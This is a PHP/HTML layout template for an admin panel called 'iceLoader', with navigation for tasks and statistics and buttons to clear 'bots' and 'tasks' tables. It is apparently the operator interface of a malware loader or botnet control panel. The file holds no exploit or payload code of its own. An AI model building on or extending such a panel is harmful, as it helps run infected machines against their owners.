<?php $segment = $this->uri->segment(1)?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>iceLoader</title>

		<link href="assets/css/bootstrap.min.css" rel="stylesheet">
		<link href="assets/css/datepicker3.css" rel="stylesheet">
		<link href="assets/css/styles.css" rel="stylesheet">
		<link href="assets/css/application.css" rel="stylesheet">
		
		<script src="assets/maps/jquery-1.8.2.min.js"></script>
		<script src="assets/js/iceLoader.js"></script>
		<!--Icons-->
		<script src="assets/js/lumino.glyphs.js"></script>

		<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
		<![endif]-->
		</head>
	<body>
		<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
			<div class="container-fluid">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#sidebar-collapse">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
					<a class="navbar-brand" href="#"><span>ice</span>loader</a>
					<ul class="user-menu">
						<li class="dropdown pull-right">
							<a href="#" class="dropdown-toggle" data-toggle="dropdown"><svg class="glyph stroked male-user"><use xlink:href="#stroked-male-user"></use></svg> Administrator <span class="caret"></span></a>
							<ul class="dropdown-menu" role="menu">
								<li><a href="#" data-toggle="modal" data-target="#panelSettings"><svg class="glyph stroked gear"><use xlink:href="#stroked-gear"></use></svg> Panel Settings</a></li>
								<li><a href="<?php echo base_url("auth/logout");?>"><svg class="glyph stroked cancel"><use xlink:href="#stroked-cancel"></use></svg> Logout</a></li>
							</ul>
						</li>
					</ul>
				</div>
								
			</div><!-- /.container-fluid -->
		</nav>
		<div id="sidebar-collapse" class="col-sm-3 col-lg-2 sidebar">
			<form role="search">
				<p><b>Panel Version: <font color="green">1.0</font></b></p>
			</form>
			<ul class="nav menu">
				<li <?php echo ($segment == '') ? 'class="active"' : ''; ?>><a href="<?php echo base_url("/");?>"><svg class="glyph stroked desktop"><use xlink:href="#stroked-desktop"/></svg> Dashboard</a></li>
				<li <?php echo ($segment == 'task') ? 'class="active"' : ''; ?>><a href="<?php echo base_url("task");?>"><svg class="glyph stroked download"><use xlink:href="#stroked-download"/></svg>Tasks</a></li>
				<li <?php echo ($segment == 'stats') ? 'class="active"' : ''; ?>><a href="<?php echo base_url("/stats");?>"><svg class="glyph stroked eye"><use xlink:href="#stroked-eye"/></svg> Statistics</a></li>
			</ul>

		</div><!--/.sidebar-->
			
		<?=$contents;?>
		
		<!-- Modal -->
		<div class="modal fade" id="panelSettings" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
			<form action="" method="POST">
				<div class="modal-dialog modal-lg" role="document">
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
							<ul class="nav nav-tabs">
								<li class="active"><a href="#panel_settings" data-toggle="tab">Database Maintenance</a></li>

							</ul>
						</div>
						<div class="modal-body tabs">

			
							<div class="tab-content">
								<div class="tab-pane fade in active" id="panel_settings">
									<h4>Database Maintenance</h4>
									<hr>
									<div id="dbMessages"></div>
									<button type="button" class="btn btn-primary" onClick="clearAllBots();">Clear Bots Table</button>
									<button type="button" class="btn btn-primary" onClick="clearAllTasks();">Clear Tasks Table</button>
								</div>
							</div>
						<div class="modal-footer">
							<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
						</div>
					</div>
				</div>
			</form>
		</div>
		
		
		<script src="assets/js/bootstrap.min.js"></script>
		<script src="assets/js/chart.min.js"></script>
		<script src="assets/js/chart-data.js"></script>
		<script src="assets/js/easypiechart.js"></script>
		<script src="assets/js/easypiechart-data.js"></script>
		<script src="assets/js/bootstrap-datepicker.js"></script>
		<script src="assets/js/bootstrap-table.js"></script>
	</body>

</html>